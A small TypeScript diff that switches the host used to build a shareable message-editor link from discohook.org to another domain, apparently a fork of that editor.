@@ -9,5 +9,5 @@ export const getEditorUrl = (manager: EditorManagerLike) => {
   const json = JSON.stringify({ messages })
   const base64 = base64UrlEncode(json)
 
-  return String(new URL(`https://discohook.org/?data=${base64}`))
+  return String(new URL(`https://quarrelpost.rainbow6.ru/?data=${base64}`))
 }
